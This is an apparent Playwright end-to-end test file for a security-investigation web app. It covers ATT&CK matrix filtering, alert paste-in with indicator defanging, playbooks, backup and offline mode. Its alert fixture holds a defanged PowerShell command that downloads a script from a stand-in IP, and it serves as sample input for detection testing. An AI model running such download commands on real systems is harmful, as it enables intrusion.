import { expect, test } from '@playwright/test';

const ALERT = JSON.stringify({
  AlertId: 'da-e2e-1',
  Title: 'Suspicious PowerShell command line',
  Severity: 'High',
  DeviceName: 'ws-e2e-02.corp.example.com',
  AccountName: 'jdoe',
  ProcessCommandLine: 'powershell -enc AAAA; iwr hxxp://198.51.100.23/a.ps1',
  MitreTechniques: ['T1059.001'],
});

test.describe('enrichment features', () => {
  test('technique panel shows groups, software, mitigations, and the TacticAtlas link; matrix filters by group', async ({ page }) => {
    await page.goto('/#/matrix?t=T1059.001');
    const drawer = page.getByRole('dialog', { name: /PowerShell/ });
    await expect(drawer.getByText(/Threat groups observed using this technique \(\d+\)/)).toBeVisible();
    await expect(drawer.getByText(/Malware and tools that implement it \(\d+\)/)).toBeVisible();
    await expect(drawer.getByText(/Mitigations \(\d+\)/)).toBeVisible();
    const atlas = drawer.getByRole('link', { name: /Command and Scripting Interpreter/ }).first();
    await expect(atlas).toHaveAttribute('href', '../#T1059');
    await page.keyboard.press('Escape');

    await page.getByLabel('Threat group').selectOption({ label: 'APT29' });
    await expect(page.getByText(/matching cells/)).toBeVisible();
    await expect(page.getByRole('button', { name: /^T1059 Command and Scripting Interpreter\./ })).toBeVisible();
  });

  test('alert paste-in suggests a playbook, pre-fills evidence, and indicators are extracted and defanged', async ({ page }) => {
    await page.goto('/#/investigations');
    await page.getByRole('button', { name: 'Start investigation' }).first().click();
    const dialog = page.getByRole('dialog', { name: 'Start an investigation' });
    await dialog.getByText('Paste the alert to pre-fill (optional)').click();
    await dialog.getByLabel('Alert JSON or text').fill(ALERT);
    await dialog.getByRole('button', { name: 'Read alert' }).click();
    await expect(dialog.getByLabel(/Playbook/)).toHaveValue('PB-PWSH-001');
    await expect(dialog.getByLabel(/Alert \/ ticket reference/)).toHaveValue('da-e2e-1');
    await expect(dialog.getByLabel('Severity')).toHaveValue('High');
    await dialog.getByRole('button', { name: 'Start investigation' }).click();

    await expect(page.getByLabel(/Hostname \/ asset ID/)).toHaveValue('ws-e2e-02.corp.example.com');
    await expect(page.getByText(/target for High/)).toBeVisible();
    await page.getByRole('tab', { name: 'Indicators' }).click();
    await expect(page.getByText('198[.]51[.]100[.]23', { exact: true })).toBeVisible();
    await expect(page.getByText('hxxp://198[.]51[.]100[.]23/a[.]ps1')).toBeVisible();

    // Chain to a related playbook: evidence is carried over and both records are linked.
    await page.getByRole('button', { name: 'Start linked investigation' }).first().click();
    await expect(page.getByText(/^linked: INV-/)).toBeVisible();
    await expect(page.getByLabel(/Hostname \/ asset ID/)).toHaveValue('ws-e2e-02.corp.example.com');
  });

  test('shift handover, playbook Sigma rule and ES|QL query, and light theme', async ({ page }) => {
    await page.goto('/#/investigations');
    await page.getByRole('button', { name: 'Shift handover' }).click();
    await expect(page.getByRole('dialog', { name: 'Shift handover summary' })).toContainText('# Shift handover');
    await page.getByRole('button', { name: 'Close' }).click();

    await page.goto('/#/playbooks/PB-KERBEROAST-001');
    await expect(page.getByText('Kerberos Service Ticket Requested With RC4 Encryption', { exact: true })).toBeVisible();
    await expect(page.getByRole('button', { name: /ES\|QL Service-ticket requests per account/ })).toBeVisible();

    await page.goto('/#/settings');
    await page.getByLabel('Theme').selectOption('light');
    await expect(page.locator('html')).toHaveClass(/light/);
    await page.reload();
    await expect(page.locator('html')).toHaveClass(/light/);
  });

  test('backup export can be imported again', async ({ page }) => {
    await page.goto('/#/settings');
    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Export backup (JSON)' }).click()]);
    const path = await download.path();
    page.once('dialog', (d) => void d.accept());
    await page.getByRole('button', { name: 'Delete all investigations' }).click();
    await page.goto('/#/investigations');
    await expect(page.getByText('No investigations yet')).toBeVisible();
    await page.getByLabel('Import investigations JSON file').setInputFiles(path!);
    await expect(page.getByText(/Imported 3 new/)).toBeVisible();
    await expect(page.getByText('DEMO-ALERT-1001').first()).toBeVisible();
  });
});

test.describe('offline', () => {
  test.use({ serviceWorkers: 'allow' });
  test('works offline after the first visit', async ({ page, context, browserName }) => {
    test.skip(browserName === 'webkit', 'Playwright WebKit does not support offline emulation with service workers reliably.');
    await page.goto('/');
    await expect(page.getByRole('heading', { name: 'Dashboard' })).toBeVisible();
    await page.evaluate(async () => {
      await navigator.serviceWorker.ready;
    });
    await page.reload(); // now controlled by the service worker
    await expect(page.getByText('Enterprise v20.1')).toBeVisible();
    await context.setOffline(true);
    await page.reload();
    await expect(page.getByRole('heading', { name: 'Dashboard' })).toBeVisible();
    await page.getByRole('link', { name: 'ATT&CK Enterprise Matrix' }).click();
    await expect(page.getByRole('heading', { name: 'Reconnaissance' })).toBeVisible();
  });
});
